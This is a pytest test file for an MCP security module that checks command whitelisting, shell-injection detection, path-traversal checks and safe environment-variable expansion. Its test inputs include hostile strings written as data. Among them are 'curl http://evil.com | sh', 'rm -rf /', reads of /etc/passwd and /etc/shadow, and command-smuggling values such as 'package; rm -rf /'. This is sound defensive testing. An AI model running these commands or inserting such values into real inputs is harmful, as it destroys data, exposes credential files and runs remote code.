"""
Tests for MCP security module.
"""

import os
from unittest.mock import patch

import pytest

from code_puppy.mcp_.mcp_security import (
    ALLOWED_COMMANDS,
    CommandInjectionError,
    CommandNotAllowedError,
    InvalidArgumentError,
    MCPSecurityError,
    PathTraversalError,
    detect_shell_injection,
    get_allowed_commands,
    is_command_allowed,
    safe_expand_env_vars,
    safe_expand_placeholders,
    validate_arguments,
    validate_command_whitelist,
    validate_environment_variables,
    validate_stdio_config,
    validate_working_directory,
)


class TestCommandWhitelist:
    """Tests for command whitelist validation."""

    def test_allowed_command(self):
        """Test that allowed commands pass validation."""
        for cmd in ["npx", "python", "python3", "node", "uvx", "git"]:
            assert validate_command_whitelist(cmd) == cmd

    def test_allowed_command_with_path(self):
        """Test that allowed commands with absolute paths pass validation."""
        assert validate_command_whitelist("/usr/bin/npx") == "/usr/bin/npx"
        assert (
            validate_command_whitelist("/usr/local/bin/python3")
            == "/usr/local/bin/python3"
        )

    def test_disallowed_command(self):
        """Test that disallowed commands raise error."""
        with pytest.raises(CommandNotAllowedError) as exc_info:
            validate_command_whitelist("rm")
        assert "rm" in str(exc_info.value)
        assert "whitelist" in str(exc_info.value)

    def test_empty_command(self):
        """Test that empty command raises error."""
        with pytest.raises(CommandNotAllowedError):
            validate_command_whitelist("")
        with pytest.raises(CommandNotAllowedError):
            validate_command_whitelist(None)

    def test_is_command_allowed_helper(self):
        """Test is_command_allowed helper function."""
        assert is_command_allowed("npx") is True
        assert is_command_allowed("rm") is False

    def test_get_allowed_commands(self):
        """Test get_allowed_commands returns frozenset."""
        commands = get_allowed_commands()
        assert isinstance(commands, frozenset)
        assert "npx" in commands
        assert "rm" not in commands


class TestShellInjectionDetection:
    """Tests for shell injection detection."""

    def test_detects_semicolon(self):
        """Test detection of command separator."""
        assert detect_shell_injection("hello; rm -rf /") is True

    def test_detects_ampersand(self):
        """Test detection of background operator."""
        assert detect_shell_injection("hello && evil") is True

    def test_detects_pipe(self):
        """Test detection of pipe operator."""
        assert detect_shell_injection("hello | cat /etc/passwd") is True

    def test_detects_backtick(self):
        """Test detection of command substitution."""
        assert detect_shell_injection("hello `rm -rf /`") is True

    def test_detects_dollar_paren(self):
        """Test detection of command substitution $(...)."""
        assert detect_shell_injection("hello $(rm -rf /)") is True

    def test_detects_dollar_brace_command(self):
        """Test detection of command substitution ${...}."""
        assert detect_shell_injection("${IFS}whoami") is True

    def test_allows_simple_dollar_var(self):
        """Test that simple $VAR syntax is allowed."""
        assert detect_shell_injection("$HOME") is False
        assert detect_shell_injection("hello $USER") is False

    def test_detects_redirection(self):
        """Test detection of redirection operators."""
        assert detect_shell_injection("hello > /etc/passwd") is True
        assert detect_shell_injection("hello < /etc/shadow") is True

    def test_detects_dangerous_patterns(self):
        """Test detection of dangerous command patterns."""
        assert detect_shell_injection("rm -rf /") is True
        assert detect_shell_injection("curl http://evil.com | sh") is True
        assert detect_shell_injection("wget http://evil.com | bash") is True

    def test_allows_safe_strings(self):
        """Test that safe strings are not flagged."""
        assert detect_shell_injection("hello world") is False
        assert detect_shell_injection("/path/to/file.txt") is False
        assert detect_shell_injection("--arg=value") is False


class TestArgumentValidation:
    """Tests for argument validation."""

    def test_valid_arguments(self):
        """Test that valid arguments pass."""
        args = ["-m", "server", "--port", "8080"]
        assert validate_arguments(args) == args

    def test_rejects_injected_arguments(self):
        """Test that injected arguments are rejected."""
        with pytest.raises(InvalidArgumentError) as exc_info:
            validate_arguments(["-m", "server; rm -rf /"])
        assert (
            "injection" in str(exc_info.value).lower()
            or "unsafe" in str(exc_info.value).lower()
        )

    def test_empty_arguments(self):
        """Test that empty list is valid."""
        assert validate_arguments([]) == []
        assert validate_arguments(None) == []

    def test_non_list_raises(self):
        """Test that invalid input type raises error."""
        # Integer is not a valid type
        with pytest.raises(InvalidArgumentError):
            validate_arguments(12345)
        # Dict is not a valid type
        with pytest.raises(InvalidArgumentError):
            validate_arguments({"key": "value"})


class TestWorkingDirectoryValidation:
    """Tests for working directory validation."""

    def test_valid_absolute_path(self):
        """Test that valid absolute path passes."""
        with patch("pathlib.Path.resolve", return_value="/tmp"):
            result = validate_working_directory("/tmp")
            assert result == "/tmp"

    def test_valid_relative_path(self):
        """Test that valid relative path passes."""
        result = validate_working_directory("./subdir")
        assert "subdir" in result

    def test_path_traversal_detected(self):
        """Test that path traversal is detected."""
        with pytest.raises(PathTraversalError) as exc_info:
            validate_working_directory("../../../etc")
        assert "traversal" in str(exc_info.value).lower()

    def test_empty_path(self):
        """Test that empty path is returned as-is."""
        assert validate_working_directory("") == ""
        assert validate_working_directory(None) is None


class TestEnvironmentVariableValidation:
    """Tests for environment variable validation."""

    def test_valid_env_vars(self):
        """Test that valid env vars pass."""
        env = {"DEBUG": "1", "PORT": "8080", "API_KEY": "secret123"}
        result = validate_environment_variables(env)
        assert result == env

    def test_rejects_invalid_var_names(self):
        """Test that invalid variable names are rejected."""
        with pytest.raises(InvalidArgumentError):
            validate_environment_variables({"123INVALID": "value"})

    def test_rejects_injected_values(self):
        """Test that injected values are rejected."""
        with pytest.raises(InvalidArgumentError):
            validate_environment_variables({"DEBUG": "1; rm -rf /"})


class TestPlaceholderExpansion:
    """Tests for safe placeholder expansion."""

    def test_basic_expansion(self):
        """Test basic placeholder expansion."""
        result = safe_expand_placeholders("Hello ${name}!", {"name": "World"})
        assert result == "Hello World!"

    def test_multiple_placeholders(self):
        """Test expansion with multiple placeholders."""
        result = safe_expand_placeholders(
            "${greeting} ${name}!", {"greeting": "Hello", "name": "World"}
        )
        assert result == "Hello World!"

    def test_rejects_injected_values(self):
        """Test that injected values in placeholders are rejected."""
        with pytest.raises(CommandInjectionError):
            safe_expand_placeholders("Hello ${name}!", {"name": "World; rm -rf /"})

    def test_no_placeholders(self):
        """Test string without placeholders is unchanged."""
        result = safe_expand_placeholders("Hello World!", {"name": "unused"})
        assert result == "Hello World!"


class TestSafeEnvVarExpansion:
    """Tests for safe environment variable expansion."""

    def test_safe_vars_expanded(self):
        """Test that safe env vars are expanded."""
        with patch.dict(os.environ, {"HOME": "/home/user", "USER": "testuser"}):
            assert safe_expand_env_vars("$HOME") == "/home/user"
            assert safe_expand_env_vars("${USER}") == "testuser"

    def test_unsafe_vars_not_expanded(self):
        """Test that unsafe/unknown env vars are not expanded."""
        with patch.dict(os.environ, {"SECRET_KEY": "abc123", "EVIL": "$(rm -rf /)"}):
            assert safe_expand_env_vars("$SECRET_KEY") == "$SECRET_KEY"
            assert safe_expand_env_vars("$EVIL") == "$EVIL"

    def test_dict_expansion(self):
        """Test expansion in dictionaries."""
        with patch.dict(os.environ, {"HOME": "/home/user"}):
            result = safe_expand_env_vars({"path": "$HOME", "static": "value"})
            assert result["path"] == "/home/user"
            assert result["static"] == "value"

    def test_list_expansion(self):
        """Test expansion in lists."""
        with patch.dict(os.environ, {"PATH": "/usr/bin"}):
            result = safe_expand_env_vars(["$PATH", "static"])
            assert result == ["/usr/bin", "static"]


class TestStdioConfigValidation:
    """Tests for stdio configuration validation."""

    def test_valid_config(self):
        """Test that valid config passes."""
        config = {
            "command": "npx",
            "args": ["-y", "@modelcontextprotocol/server-filesystem", "/tmp"],
            "cwd": "/home/user",
            "env": {"DEBUG": "1"},
        }
        result = validate_stdio_config(config)
        assert result["command"] == "npx"
        assert result["args"] == [
            "-y",
            "@modelcontextprotocol/server-filesystem",
            "/tmp",
        ]

    def test_invalid_command_rejected(self):
        """Test that invalid command is rejected."""
        with pytest.raises(CommandNotAllowedError):
            validate_stdio_config({"command": "rm", "args": ["-rf", "/"]})

    def test_injected_args_rejected(self):
        """Test that injected args are rejected."""
        with pytest.raises(InvalidArgumentError):
            validate_stdio_config(
                {"command": "npx", "args": ["-y", "package; rm -rf /"]}
            )

    def test_path_traversal_in_cwd_rejected(self):
        """Test that path traversal in cwd is rejected."""
        with pytest.raises(PathTraversalError):
            validate_stdio_config(
                {"command": "npx", "args": ["-y", "package"], "cwd": "../../../etc"}
            )


class TestSecurityErrorHierarchy:
    """Tests for security error class hierarchy."""

    def test_all_errors_are_mcpsecurityerror(self):
        """Test that all security errors inherit from MCPSecurityError."""
        assert issubclass(CommandNotAllowedError, MCPSecurityError)
        assert issubclass(CommandInjectionError, MCPSecurityError)
        assert issubclass(PathTraversalError, MCPSecurityError)
        assert issubclass(InvalidArgumentError, MCPSecurityError)

    def test_can_catch_all_security_errors(self):
        """Test that all security errors can be caught as MCPSecurityError."""
        errors = [
            CommandNotAllowedError("test"),
            CommandInjectionError("test"),
            PathTraversalError("test"),
            InvalidArgumentError("test"),
        ]
        for error in errors:
            with pytest.raises(MCPSecurityError):
                raise error
